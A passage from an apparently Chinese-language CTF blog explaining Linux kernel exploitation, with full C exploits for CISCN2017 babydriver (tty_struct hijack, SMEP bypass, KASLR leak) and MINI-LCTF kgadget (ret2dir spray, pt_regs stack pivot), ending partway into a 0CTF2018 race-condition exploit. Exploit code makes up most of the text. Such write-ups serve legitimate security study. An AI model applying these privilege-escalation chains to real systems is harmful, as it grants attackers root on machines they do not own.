class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], i = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = pop_rdi_ret;</span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = mov_cr4_rdi_pop_rbp_ret;  <span class="comment">// bypass smep</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = getRoot;</span><br><span class="line">    rop[i++] = swapgs_pop_rbp_ret;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = iretq_ret;</span><br><span class="line">    rop[i++] = getShell;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++)</span><br><span class="line">        fake_op[j] = mov_rsp_rax_dec_ebx_ret;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = pop_rax_ret;  <span class="comment">//令rax指向我们的rop</span></span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line">    fake_op[<span class="number">7</span>] = mov_rsp_rax_dec_ebx_ret;  <span class="comment">// 原为write函数指针</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);  <span class="comment">// 读取tty_struct的数据</span></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;  <span class="comment">// hijack *ops</span></span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);  <span class="comment">// tty_operation -&gt; write</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2017-babydriver-KASLR-kptr-restrict"><a href="#CISCN2017-babydriver-KASLR-kptr-restrict" class="headerlink" title="CISCN2017 babydriver+KASLR+kptr_restrict"></a>CISCN2017 babydriver+KASLR+kptr_restrict</h2><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>开启了<code>KASLR</code>后地址随机化其由于开启了<code>kptr_restrict</code>，我们无法直接从<code>kallsyms</code>中直接读取出函数的地址，这时候我们就需要泄露出地址来计算偏移。在之前我能够将<code>tty_struct</code>给泄露出来，而在这一个结构体中，<code>const struct tty_operations *ops;</code> 默认指向<code>ptm_unix98_ops</code> 或 <code>pty_unix98_ops</code>。因此，我们能够利用这个来泄露出内核的基址，然后计算出函数和<code>gadget</code>的准确位置，其他操作和之前一样</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff810d238d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rax_ret = <span class="number">0xffffffff8100ce6e</span>;</span><br><span class="line"><span class="type">size_t</span> mov_cr4_rdi_pop_rbp_ret = <span class="number">0xffffffff81004d80</span>;</span><br><span class="line"><span class="type">size_t</span> mov_rsp_rax_dec_ebx_ret = <span class="number">0xffffffff8181bfc5</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_pop_rbp_ret = <span class="number">0xffffffff81063694</span>;</span><br><span class="line"><span class="type">size_t</span> iretq_ret = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line"><span class="type">size_t</span> ret = <span class="number">0xffffffff813659b6</span>;</span><br><span class="line"><span class="type">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810a1420</span>;</span><br><span class="line"><span class="type">size_t</span> PTY_UNIX98_OPS = <span class="number">0xffffffff81a74e60</span>;</span><br><span class="line"><span class="type">size_t</span> PTM_UNIX98_OPS = <span class="number">0xffffffff81a74f80</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %2\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %3\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_sp),<span class="string">&quot;=r&quot;</span>(user_rflags)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRoot</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span>* (*pkc)(<span class="type">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*cc)(<span class="type">char</span>*) = commit_creds;</span><br><span class="line">    (*cc)( (*pkc)(<span class="number">0</span>) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_tty[<span class="number">0x20</span>];</span><br><span class="line">    <span class="type">int</span> fd3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    read(fd2, fake_tty, <span class="number">0x40</span>);  <span class="comment">// 读取tty_struct的数据</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tty_ops = *(<span class="type">size_t</span>*)(fake_tty + <span class="number">3</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = ((tty_ops &amp; <span class="number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="number">0xfff</span>) ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred += kernel_offset;</span><br><span class="line">    commit_creds  += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] commit_creds: \033[0m%p\n&quot;</span>, commit_creds);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x20</span>], p = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = pop_rdi_ret + kernel_offset;</span><br><span class="line">    rop[p++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[p++] = mov_cr4_rdi_pop_rbp_ret + kernel_offset;  <span class="comment">// bypass smep</span></span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = getRoot;</span><br><span class="line">    rop[p++] = swapgs_pop_rbp_ret + kernel_offset;</span><br><span class="line">    rop[p++] = <span class="number">0</span>;</span><br><span class="line">    rop[p++] = iretq_ret + kernel_offset;</span><br><span class="line">    rop[p++] = getShell;</span><br><span class="line">    rop[p++] = user_cs;</span><br><span class="line">    rop[p++] = user_rflags;</span><br><span class="line">    rop[p++] = user_sp;</span><br><span class="line">    rop[p++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">        fake_op[i] = mov_rsp_rax_dec_ebx_ret + kernel_offset;</span><br><span class="line"></span><br><span class="line">    fake_op[<span class="number">0</span>] = pop_rax_ret + kernel_offset;  <span class="comment">//令rax指向我们的rop</span></span><br><span class="line">    fake_op[<span class="number">1</span>] = rop;</span><br><span class="line">    fake_op[<span class="number">7</span>] = mov_rsp_rax_dec_ebx_ret + kernel_offset;  <span class="comment">// 原为write函数指针</span></span><br><span class="line"></span><br><span class="line">    fake_tty[<span class="number">3</span>] = fake_op;  <span class="comment">// hijack *ops</span></span><br><span class="line">    write(fd2, fake_tty, <span class="number">0x40</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x8</span>];</span><br><span class="line">    write(fd3, buf, <span class="number">0x8</span>);  <span class="comment">// tty_operation -&gt; write</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MINI-LCTF-kgadget"><a href="#MINI-LCTF-kgadget" class="headerlink" title="MINI-LCTF kgadget"></a>MINI-LCTF kgadget</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们可以看到当<code>ioctl</code>的第二个参数为<code>114514</code>时，内核会对<code>rdx</code>进行解引用然后执行<br>由于内核开启了<code>samp</code>和<code>semp</code>保护，导致我们无法直接的使用<code>kernel rop</code>，所以我们可以使用<code>ret2dir + mmap spary</code><br>这里需要注意的是，解引用的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov qword ptr [rsp], rbx</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>我们可以看到其并没有令<code>rsp</code>寄存器指向我们的恶意代码的区域，所以我们可以利用<code>pt_regs</code>来进行栈迁移</p><h4 id="pt-regs"><a href="#pt-regs" class="headerlink" title="pt_regs"></a>pt_regs</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r15;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r14;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r13;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r12;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r11;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r10;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r9;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> r8;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rax;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rcx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsi;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rip;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> cs;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> rsp;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这个结构体存放了一系列的寄存器，这是因为在进行系统调用时，会完成从用户态到内核态的切换，因此需要保存用户态时的上下文寄存器，而这些寄存器的值都需要保存在<code>pt_regs</code>中。<br>而我们发现题目的作者限制了我们只能够控制<code>r8</code>和<code>r9</code>存储器。我们可以计算发现栈顶距离<code>r9</code>寄存器的距离为<code>0xc0</code>，于是我们可以使用下面两句汇编来进行栈迁移</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret; </span><br><span class="line">pop rsp; ret;</span><br></pre></td></tr></table></figure><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/fcntl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pop_rdi = <span class="number">0xffffffff8108c6f0</span>; <span class="comment">// pop rdi ; ret</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs = <span class="number">0xffffffff81c0129c</span>; <span class="comment">// swapgs ; nop ; nop ; nop ; ret</span></span><br><span class="line"><span class="type">size_t</span> iretq = <span class="number">0xffffffff810002df</span>;</span><br><span class="line"><span class="type">size_t</span> add_rsp_0xc0 = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span> xor_esi_ret = <span class="number">0xffffffff81224afc</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">size_t</span> target;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line"><span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line"><span class="string">&quot;movq %%rsp, %3\n&quot;</span></span><br><span class="line"><span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line"><span class="string">&quot;popq %2\n&quot;</span></span><br><span class="line">:<span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss),<span class="string">&quot;=r&quot;</span>(user_rflags),<span class="string">&quot;=r&quot;</span>(user_sp)</span><br><span class="line"> :</span><br><span class="line"> : <span class="string">&quot;memory&quot;</span></span><br><span class="line"> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spary</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span>* rop;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">15000</span>; i++)&#123;</span><br><span class="line">        rop = mmap(<span class="literal">NULL</span>, <span class="number">4096</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2048</span>/<span class="number">8</span>; j++) rop[j] = add_rsp_0xc0;</span><br><span class="line">        <span class="keyword">for</span> (;j &lt; <span class="number">4096</span>/<span class="number">8</span>; j++) rop[j] = xor_esi_ret;</span><br><span class="line">        rop[--j] = user_ss;</span><br><span class="line">        rop[--j] = user_sp;</span><br><span class="line">        rop[--j] = user_rflags;</span><br><span class="line">        rop[--j] = user_cs;</span><br><span class="line">        rop[--j] = (<span class="type">size_t</span>)getShell;</span><br><span class="line">        rop[--j] = <span class="number">0</span>;</span><br><span class="line">        rop[--j] = <span class="number">0</span>;</span><br><span class="line">        rop[--j] = swapgs_restore_regs_and_return_to_usermode+<span class="number">27</span>;</span><br><span class="line">        rop[--j] = commit_creds;</span><br><span class="line">        rop[--j] = init_cred;</span><br><span class="line">        rop[--j] = pop_rdi;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m[+]physamp spary successfully\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_stats();   </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    spary();</span><br><span class="line">    </span><br><span class="line">    target =  <span class="number">0xffff888000000000</span> + <span class="number">0x6000000</span>;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  pop_rsp_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  target;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, 0x10;&quot;</span> <span class="comment">// ioctl的系统调用号</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, target;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x1BF52;&quot;</span>  <span class="comment">// 控制ioctl的第二个参数</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0CTF2018-Final-baby-kernel"><a href="#0CTF2018-Final-baby-kernel" class="headerlink" title="[0CTF2018 Final] baby kernel"></a>[0CTF2018 Final] baby kernel</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>该题主要是让我们输入传进一个结构体，只要满足条件即可<code>printk</code>出<code>flag</code>，<code>printk</code>的结果可以通过<code>dmesg</code>来获得<br>没什么好说的，考点为条件竞争，从<code>start.sh</code>中我们也可以看到他是双核。利用条件竞争使其同时满足两个<code>if</code>的判断</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 